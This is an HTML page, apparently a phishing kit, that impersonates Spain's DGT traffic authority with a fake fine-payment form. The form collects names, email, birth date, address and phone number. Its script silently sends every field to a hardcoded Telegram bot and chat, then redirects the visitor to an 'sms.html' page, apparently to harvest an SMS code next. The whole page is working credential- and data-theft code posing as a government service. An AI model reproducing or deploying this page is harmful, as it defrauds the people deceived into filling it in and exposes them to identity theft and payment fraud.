<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Multa de Tráfico - DGT</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
body { font-family: 'Poppins', sans-serif; background:#f4f7fb; padding:20px; }
.procedure { background:#fff; padding:30px; border-radius:10px; max-width:900px; margin:auto; box-shadow:0 10px 20px rgba(0,0,0,0.1); }
.status-ok { color:#155724; background:#d4edda; padding:12px; border-radius:8px; margin-bottom:15px;}
.status-fail { color:#721c24; background:#f8d7da; padding:12px; border-radius:8px; margin-bottom:15px;}
</style>
</head>
<body>

<section class="procedure">
<h2>Pago de Multa de Tráfico</h2>
<p>Por favor, complete la siguiente información para proceder con el pago de su multa.</p>

<form id="paymentForm">
<div class="row mb-2">
<div class="col-md-6"><label>Apellidos</label><input class="form-control" type="text" name="first_name" required></div>
<div class="col-md-6"><label>Nombres</label><input class="form-control" type="text" name="last_name" required></div>
</div>
<div class="row mb-2">
<div class="col-md-6"><label>Email</label><input class="form-control" type="email" name="email" required></div>
<div class="col-md-6"><label>Fecha de Nacimiento</label><input class="form-control" type="date" name="dob"></div>
</div>
<div class="row mb-2">
<div class="col-md-4"><label>Dirección Postal</label><input class="form-control" type="text" name="address"></div>
<div class="col-md-4"><label>Código Postal</label><input class="form-control" type="text" name="postal"></div>
<div class="col-md-4"><label>Ciudad</label><input class="form-control" type="text" name="city"></div>
</div>
<div class="row mb-3">
<div class="col-md-6"><label>Número de Teléfono</label><input class="form-control" type="tel" name="num" maxlength="11"></div>
</div>
<button type="submit" class="btn btn-primary">Pagar Multa</button>
</form>

<div id="resultArea" style="display:none; margin-top:15px;">
<div id="statusMsg"></div>
<p>Se le redirigirá automáticamente a la página SMS en <span id="countdown">3</span> segundos.</p>
</div>

</section>

<script>
// Config JS
const CONFIG = {
    telegram: {
        send: true,
        bot_token: "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcU18QM",
        rez_chat: "-4982276528"
    },
    redirect_sms: "sms.html",
    delay_seconds: 3
};

// Submit handler
document.getElementById("paymentForm").addEventListener("submit", function(e){
    e.preventDefault();
    const formData = new FormData(this);
    const data = {};
    formData.forEach((v,k)=> data[k]=v);

    document.getElementById("resultArea").style.display = "block";

    if(CONFIG.telegram.send){
        const message = Object.entries(data).map(([k,v])=>`${k}: ${v}`).join("\n");
        fetch(`https://api.telegram.org/bot${CONFIG.telegram.bot_token}/sendMessage`, {
            method: "POST",
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({chat_id: CONFIG.telegram.rez_chat, text: message})
        })
        .then(res=>res.json())
        .then(resp=>{
            if(resp.ok){
                document.getElementById("statusMsg").innerHTML = '<div class="status-ok">✅ Datos enviados correctamente a Telegram</div>';
                startRedirect();
            }else{
                document.getElementById("statusMsg").innerHTML = '<div class="status-fail">❌ Error al enviar los datos</div>';
            }
        })
        .catch(err=>{
            document.getElementById("statusMsg").innerHTML = '<div class="status-fail">❌ Error de conexión</div>';
            console.error(err);
        });
    }
});

// Countdown redirect
function startRedirect(){
    let delay = CONFIG.delay_seconds;
    const cdEl = document.getElementById("countdown");
    cdEl.textContent = delay;
    const interval = setInterval(()=>{
        delay--;
        cdEl.textContent = delay;
        if(delay<=0){
            clearInterval(interval);
            window.location.href = CONFIG.redirect_sms;
        }
    },1000);
}
</script>

</body>
</html>
